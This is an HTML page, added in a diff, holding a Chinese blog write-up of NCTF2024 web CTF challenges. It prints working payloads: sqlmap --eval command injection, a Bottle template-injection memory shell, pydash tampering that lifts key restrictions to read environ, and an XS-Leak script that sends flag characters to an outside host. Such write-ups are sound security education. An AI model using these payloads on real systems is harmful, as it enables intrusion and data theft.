@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这次咱08067的小登也是发力了，。 sqlmap-mastershell&#x3D;flase，只能参数注入，sqlmap是提供了这个参数的  实测如果host不存在执行不了，而机器不出网，所以使用127.0.0.1 127.0.0.1 --eval&#x3D;__import__(&#39;os&#39;).system(&#39;env&gt;&#x2F;app&#x2F;index.html&#39;) nctf{e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2024-web-wp">
+<meta property="og:url" content="https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/index.html">
+<meta property="og:site_name" content="le0n&#39;s blogs">
+<meta property="og:description" content="这次咱08067的小登也是发力了，。 sqlmap-mastershell&#x3D;flase，只能参数注入，sqlmap是提供了这个参数的  实测如果host不存在执行不了，而机器不出网，所以使用127.0.0.1 127.0.0.1 --eval&#x3D;__import__(&#39;os&#39;).system(&#39;env&gt;&#x2F;app&#x2F;index.html&#39;) nctf{e">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/2a390150ec38270507290b8e41854c25.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/0a9568114c177cb2e7a6b2087e0b3553.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/523f655a7491544dd23708bde8ef77e6.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/35cf78ada88b99d0fe2c28c585d6e6a3.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/cfa3b466208b40f98f176cfee6ef833c.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/b0158c8c5381acb62141d63991e0505c.png">
+<meta property="article:published_time" content="2025-03-24T15:16:47.000Z">
+<meta property="article:modified_time" content="2025-03-27T12:57:14.381Z">
+<meta property="article:author" content="le0n">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/2a390150ec38270507290b8e41854c25.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NCTF2024-web-wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/25/JNDI%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/14/DOMPurify%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%8E%86%E5%8F%B2%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&text=NCTF2024-web-wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&is_video=false&description=NCTF2024-web-wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCTF2024-web-wp&body=Check out this article: https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&name=NCTF2024-web-wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&t=NCTF2024-web-wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-master"><span class="toc-number">1.</span> <span class="toc-text">sqlmap-master</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-dash"><span class="toc-number">2.</span> <span class="toc-text">ez_dash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-dash-revenge"><span class="toc-number">3.</span> <span class="toc-text">ez_dash_revenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#internal-api"><span class="toc-number">4.</span> <span class="toc-text">internal_api</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">5.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#QRcode-Reconstruction"><span class="toc-number">5.1.</span> <span class="toc-text">QRcode Reconstruction</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NCTF2024-web-wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">le0n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-24T15:16:47.000Z" class="dt-published" itemprop="datePublished">2025-03-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/2a390150ec38270507290b8e41854c25.png"></p>
+<p>这次咱08067的小登也是发力了，。</p>
+<h1 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h1><p>shell&#x3D;flase，只能参数注入，sqlmap是提供了这个参数的</p>
+<p><img src="/images/0a9568114c177cb2e7a6b2087e0b3553.png"></p>
+<p>实测如果host不存在执行不了，而机器不出网，所以使用127.0.0.1</p>
+<p><code>127.0.0.1 --eval=__import__(&#39;os&#39;).system(&#39;env&gt;/app/index.html&#39;)</code></p>
+<p><font style="color:rgb(0, 0, 0);">nctf{e3e4014b-fa3b-4bf7-b751-9ffd3a7633de}</font></p>
+<h1 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a><font style="color:rgb(0, 0, 0);">ez_dash</font></h1><p>%exec()能模板注入任意代码执行，没回显我们打内存马</p>
+<p><code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;bottle&#39;].error(404)(lambda e:__import__(&#39;os&#39;).popen(&#39;env&#39;).read())</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//39.106.16.204:11883/render?path=aas123%0a%exec(%22__import__(&#x27;sys&#x27;)%22%2Bchr(46)%2B%22modules%5B&#x27;__main__&#x27;%5D%22%2Bchr(46)%2B%22__dict__%5B&#x27;bottle&#x27;%5D%22%2Bchr(46)%2B%22error(404)(lambda%20e%3A__import__(&#x27;os&#x27;)%22%2Bchr(46)%2B%22popen(&#x27;env&#x27;)%22%2Bchr(46)%2B%22read())%22)%0a</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问任意不存在的路由拿到flag</p>
+<p><img src="/images/523f655a7491544dd23708bde8ef77e6.png"></p>
+<h1 id="ez-dash-revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h1><p>pydash最新版ban掉了__globals__和__builtins__，但这题依然能打，因为本身提供了访问globals</p>
+<p><img src="/images/35cf78ada88b99d0fe2c28c585d6e6a3.png"></p>
+<p>先把ban去掉，拿回属于我们的__globals__</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8000/setValue?name=pydash</span></span><br><span class="line">&#123;<span class="string">&quot;path&quot;</span>:<span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后把模板路径改了，（直接用setval方法的全局作用域）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//39.106.16.204:14955/setValue?name=setval</span></span><br><span class="line">&#123;<span class="string">&quot;path&quot;</span>:<span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span>,<span class="string">&quot;value&quot;</span>:[<span class="string">&quot;/proc/self/&quot;</span>,<span class="string">&quot;/&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就能把environ渲染出来力</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//39.106.16.204:14955/render?path=environ</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h1><p>简单的xleak，search成功与否返回不同的状态码</p>
+<p>不太会js，只能让bot多访问几次sever（</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__)</span><br><span class="line">dic=[<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;nctf&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> FLAG</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Title&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        html += <span class="string">f&#x27;&#x27;&#x27;&lt;script src=&quot;http://127.0.0.1:8000/internal/search?s=<span class="subst">&#123;FLAG + i&#125;</span>&quot; onload=&quot;fetch(&#x27;http://115.120.246.103:1234/flag?c=<span class="subst">&#123;FLAG + i&#125;</span>&#x27;)&quot;&gt;&lt;/script&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">global</span> FLAG</span><br><span class="line">    FLAG=request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(FLAG)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">1234</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h2><p><img src="/images/cfa3b466208b40f98f176cfee6ef833c.png"></p>
+<p><img src="/images/b0158c8c5381acb62141d63991e0505c.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-master"><span class="toc-number">1.</span> <span class="toc-text">sqlmap-master</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-dash"><span class="toc-number">2.</span> <span class="toc-text">ez_dash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-dash-revenge"><span class="toc-number">3.</span> <span class="toc-text">ez_dash_revenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#internal-api"><span class="toc-number">4.</span> <span class="toc-text">internal_api</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">5.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#QRcode-Reconstruction"><span class="toc-number">5.1.</span> <span class="toc-text">QRcode Reconstruction</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&text=NCTF2024-web-wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&is_video=false&description=NCTF2024-web-wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCTF2024-web-wp&body=Check out this article: https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&title=NCTF2024-web-wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&name=NCTF2024-web-wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/03/24/NCTF2024-web-wp/&t=NCTF2024-web-wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    le0n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
